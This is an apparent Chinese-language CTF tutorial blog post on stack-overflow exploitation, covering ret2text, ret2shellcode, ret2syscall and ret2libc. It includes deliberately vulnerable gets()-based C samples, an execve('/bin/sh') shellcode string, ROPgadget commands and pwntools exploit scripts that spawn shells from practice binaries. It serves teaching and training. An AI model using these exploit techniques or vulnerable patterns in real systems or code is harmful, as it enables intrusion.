@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="栈溢出  栈基础  机制：First in Last Out 操作：push、pop   寄存器分配  一下为X86通常情况   EAX：保存函数返回值 EBX：保存局部变量 ECX：用于循环计数器 EDX：用于数学除法 ESP（Stack Point）：存放执行函数对应栈帧的栈顶地址（低地址） EBP（Basic Point）：存放执行函数对应栈帧的栈底地址（高地址），用于C运行库访问栈中的局">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn Stack Overflow">
+<meta property="og:url" content="http://example.com/2022/10/24/pwn-basic/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="栈溢出  栈基础  机制：First in Last Out 操作：push、pop   寄存器分配  一下为X86通常情况   EAX：保存函数返回值 EBX：保存局部变量 ECX：用于循环计数器 EDX：用于数学除法 ESP（Stack Point）：存放执行函数对应栈帧的栈顶地址（低地址） EBP（Basic Point）：存放执行函数对应栈帧的栈底地址（高地址），用于C运行库访问栈中的局">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pictures/StackFrame.jpg">
+<meta property="og:image" content="http://example.com/pictures/ASMCmd.png">
+<meta property="article:published_time" content="2022-10-24T04:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="Basic Knowledge">
+<meta property="article:tag" content="Stack Overflow">
+<meta property="article:tag" content="Noob">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/pictures/StackFrame.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Pwn Stack Overflow</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/10/25/pwn-learn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/09/16/htb-health/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/24/pwn-basic/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/24/pwn-basic/&text=Pwn Stack Overflow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/24/pwn-basic/&is_video=false&description=Pwn Stack Overflow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn Stack Overflow&body=Check out this article: http://example.com/2022/10/24/pwn-basic/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/24/pwn-basic/&name=Pwn Stack Overflow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/24/pwn-basic/&t=Pwn Stack Overflow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text"> 栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 栈基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%88%86%E9%85%8D"><span class="toc-number">1.2.</span> <span class="toc-text"> 寄存器分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-frame-details"><span class="toc-number">1.3.</span> <span class="toc-text"> Stack Frame Details:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%AE%B5"><span class="toc-number">1.4.</span> <span class="toc-text"> 信息段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rettext"><span class="toc-number">1.5.</span> <span class="toc-text"> rettext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.6.</span> <span class="toc-text"> ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.7.</span> <span class="toc-text"> ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.8.</span> <span class="toc-text"> ret2libc</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Pwn Stack Overflow
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-24T04:00:00.000Z" itemprop="datePublished">2022-10-24</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/PWN/">PWN</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Basic-Knowledge/" rel="tag">Basic Knowledge</a>, <a class="tag-link-link" href="/tags/Noob/" rel="tag">Noob</a>, <a class="tag-link-link" href="/tags/Stack-Overflow/" rel="tag">Stack Overflow</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="栈溢出"><a class="markdownIt-Anchor" href="#栈溢出"></a> 栈溢出</h2>
+<h3 id="栈基础"><a class="markdownIt-Anchor" href="#栈基础"></a> 栈基础</h3>
+<ul>
+<li>机制：First in Last Out</li>
+<li>操作：push、pop</li>
+</ul>
+<h3 id="寄存器分配"><a class="markdownIt-Anchor" href="#寄存器分配"></a> 寄存器分配</h3>
+<blockquote>
+<p>一下为X86通常情况</p>
+</blockquote>
+<ul>
+<li>EAX：保存函数返回值</li>
+<li>EBX：保存局部变量</li>
+<li>ECX：用于循环计数器</li>
+<li>EDX：用于数学除法</li>
+<li>ESP（Stack Point）：存放执行函数对应栈帧的栈顶地址（低地址）</li>
+<li>EBP（Basic Point）：存放执行函数对应栈帧的栈底地址（高地址），用于C运行库访问栈中的局部变量和参数</li>
+<li><u><strong>比较特殊的是EIP(Instruction Pointer)只能被ret jump call等指令隐含地改变</strong></u></li>
+</ul>
+<h3 id="stack-frame-details"><a class="markdownIt-Anchor" href="#stack-frame-details"></a> Stack Frame Details:</h3>
+<blockquote>
+<p>Source from wangan</p>
+</blockquote>
+<p><img src="/pictures/StackFrame.jpg" alt="StackFrame" /></p>
+<blockquote>
+<p>Source from wangan</p>
+</blockquote>
+<p><img src="/pictures/ASMCmd.png" alt="StackFrameCommand" /></p>
+<h3 id="信息段"><a class="markdownIt-Anchor" href="#信息段"></a> 信息段</h3>
+<ol>
+<li>bss段<br />
+通常是指用来存放程序中未初始化的或者初始化为0的全局变量和局部静态变量的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配。</li>
+<li>data段<br />
+数据段（data segment）通常是指用来存放程序中已初始化的全局变量和局部静态变量的一块内存区域，初始化为0的变量出于编译优化的策略还是被保存在BSS段。数据段属于静态内存分配。</li>
+<li>rodata段<br />
+ro即Read-Only的意思，特殊情况如下</li>
+</ol>
+<ul>
+<li>有些立即数与指令编译在一起直接放在代码段</li>
+<li>对于字符串常量，编译器会去掉重复的常量，让程序的每个字符串常量只有一份。</li>
+<li>有些系统中rodata段是多个进程共享的，目的是为了提高空间的利用率</li>
+</ul>
+<ol start="4">
+<li>.text段<br />
+存放程序代码，只可读并且在编译时确定代码段</li>
+<li>.dynstr段<br />
+该段存放调用动态库信息和调用的相关函数</li>
+</ol>
+<h3 id="rettext"><a class="markdownIt-Anchor" href="#rettext"></a> rettext</h3>
+<ol>
+<li>常见题型</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getTreasure</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get treasure here!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vul</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>比较典型的就是我们通过gets可以无限输入字符流的特点来将<code>EBP</code>覆盖掉，然后将返回地址改写至<code>getTreasure()</code></p>
+<ol start="2">
+<li>EXP</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">treasure_addr = <span class="string">&#x27;type your treasure_addr here&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(<span class="number">0xcafebabe</span>)+p32(treasure_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+<h3 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h3>
+<ol>
+<li>构造shellcode</li>
+</ol>
+<ul>
+<li>手动构造: <code>shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</code></li>
+<li>python-pwntools：<code>shellcode = asm(shellcraft.sh())</code></li>
+</ul>
+<ol start="2">
+<li>例题分析：</li>
+</ol>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line"><span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在main处设置断点</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  0x804852e &lt;main+1&gt;:  mov    ebp,esp</span><br><span class="line">  0x8048530 &lt;main+3&gt;:  and    esp,0xfffffff0</span><br><span class="line">  0x8048533 &lt;main+6&gt;:  add    esp,0xffffff80</span><br><span class="line">=&gt; 0x8048536 &lt;main+9&gt;:  mov    eax,ds:0x804a060</span><br><span class="line">  0x804853b &lt;main+14&gt;: mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">  0x8048543 &lt;main+22&gt;: mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">  0x804854b &lt;main+30&gt;: mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">  0x8048553 &lt;main+38&gt;: mov    DWORD PTR [esp],eax</span><br></pre></td></tr></table></figure>
+<h3 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall"></a> ret2syscall</h3>
+<ol>
+<li>原理<br />
+ret2syscall，即控制程序执行系统调用，获取 shell</li>
+<li>分析<br />
+由于开启了NX保护不能直接直接跳转程序中的某一段代码或者自己构造shellcode来进入shell，只能利用程序里gadget来达成目的<br />
+需要用到的工具<a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></li>
+</ol>
+<ul>
+<li>查找控制eax的gatget<br />
+<code>ROPgadget --binary rop --only 'pop|ret' | grep 'eax'</code></li>
+<li>查找&quot;/bin/sh&quot;对应字符串<br />
+<code>ROPgadget --binary rop --string '/bin/sh'</code></li>
+<li>查找system系统调用地址
+<blockquote>
+<p>Linux 在x86上的系统调用通过 int 80h 实现    --wikipedia<br />
+<code>ROPgadget --binary rop --only 'int'</code></p>
+</blockquote>
+</li>
+</ul>
+<ol start="3">
+<li>例题</li>
+</ol>
+<blockquote>
+<p>权限: CANARY:disabled  FORTIFY:disabled  NX:ENABLED  PIE:disabled  RELRO:Partial</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>EXP</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ebx_ecx_edx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_string = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_ebx_ecx_edx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_string,int_0x80])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h3>
+<ol>
+<li>原理<br />
+执行libc中的函数，达到控制输出获取shell命令的目的</li>
+<li>例子</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$: checksec ret2libc1    </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>找到地址</li>
+</ol>
+<ul>
+<li>找到/bin/sh  <code>ROPgadget --binary ret2libc1 --string '/bin/sh' </code></li>
+<li>找到system函数地址 <code>info address system</code>(gdb)</li>
+</ul>
+<ol start="4">
+<li>EXP</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里的’b’*4是system的虚假返回地址，binsh_addr是system的第一个参数，相当于执行了system(‘/bin/sh’);</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.</span> <span class="toc-text"> 栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text"> 栈基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%88%86%E9%85%8D"><span class="toc-number">1.2.</span> <span class="toc-text"> 寄存器分配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-frame-details"><span class="toc-number">1.3.</span> <span class="toc-text"> Stack Frame Details:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%AE%B5"><span class="toc-number">1.4.</span> <span class="toc-text"> 信息段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rettext"><span class="toc-number">1.5.</span> <span class="toc-text"> rettext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.6.</span> <span class="toc-text"> ret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.7.</span> <span class="toc-text"> ret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.8.</span> <span class="toc-text"> ret2libc</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/24/pwn-basic/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/24/pwn-basic/&text=Pwn Stack Overflow"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/24/pwn-basic/&is_video=false&description=Pwn Stack Overflow"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Pwn Stack Overflow&body=Check out this article: http://example.com/2022/10/24/pwn-basic/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/24/pwn-basic/&title=Pwn Stack Overflow"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/24/pwn-basic/&name=Pwn Stack Overflow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/24/pwn-basic/&t=Pwn Stack Overflow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    Andy
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
